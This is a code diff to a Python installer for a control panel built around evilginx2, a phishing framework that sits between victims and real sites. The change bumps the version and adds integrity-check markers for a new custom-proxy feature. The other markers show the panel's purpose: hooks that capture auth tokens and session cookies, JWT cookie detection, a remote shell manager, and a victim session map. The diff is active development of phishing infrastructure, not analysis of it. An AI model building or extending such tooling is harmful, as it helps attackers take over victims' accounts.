@@ -41,7 +41,7 @@ if getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
     HERE = sys._MEIPASS
 PAYLOAD = os.path.join(HERE, "payload")
 PANEL_PORT = 8443
-PANEL_BUILD = "3.5.4"  # keep in sync with payload/app.py PANEL_VERSION
+PANEL_BUILD = "3.5.5"  # keep in sync with payload/app.py PANEL_VERSION
 GO_VER = "1.20"
 REMOTE_HOME_DEFAULT = "/root"
 REMOTE_EGX = "/root/evilginx2"
@@ -556,11 +556,12 @@ class Installer:
         hook_py = os.path.join(PAYLOAD, "patches", "apply_egx_429_hook.py")
         required_marks = {
             hook_py: ["egx-429", "StatusCode == 429", "auth_tokens = pl.cookieAuthTokens"],
-            os.path.join(PAYLOAD, "app.py"): ["def api_sessions_clear", "def api_fs_list", "def api_service_create", "def favicon", "def _cookie_looks_like_jwt", "class ShellManager", "class JournalFollower", "def api_health", "def api_proxy_key", "import proxy_engine", "def api_proxy_carousel", "def _proxy_live_loop", "def _parse_exec_start", "PYTHONUNBUFFERED", "def api_dashboard_map", "_geo_lookup"],
+            os.path.join(PAYLOAD, "app.py"): ["def api_sessions_clear", "def api_fs_list", "def api_service_create", "def favicon", "def _cookie_looks_like_jwt", "class ShellManager", "class JournalFollower", "def api_health", "def api_proxy_key", "import proxy_engine", "def api_proxy_carousel", "def _proxy_live_loop", "def _parse_exec_start", "PYTHONUNBUFFERED", "def api_dashboard_map", "_geo_lookup", "def api_proxy_custom_add"],
             os.path.join(PAYLOAD, "proxy_engine.py"): [
                 "def deploy_async", "class _Sidecar", "def record_auth_429", "def repair_instance",
                 "def _install_squid", "def detach", "def drop_proxy_tunnels", "def _wait_guest_ready", "def _repair_install",
                 "APT_IDLE", "settle 5s", "def set_carousel", "def live_snapshot",
+                "def add_custom_proxies", "CUSTOM_TYPES", "_upstream_connect",
             ],
             os.path.join(PAYLOAD, "templates", "index.html"): [
                 "File Explorer", "page-services", "CLEAR DATABASE", "openNewService",
@@ -571,6 +572,7 @@ class Installer:
                 "pxCarouselBtn", "proxy_live", "svcShow", "svcModify", "fa-toggle-on", "Show service file",
                 "Session Map", "dashClickPoint", "dash-z-reset",
                 "dashMapSearch", "dashMapCountry", "dashGoHit",
+                "pxCustomAdd", "Add Custom Proxies", "pxCustomType",
             ],
             os.path.join(PAYLOAD, "templates", "login.html"): [
                 "/static/logo.png", "favicon-32.png", "logo-mark", "ZynTarvo",
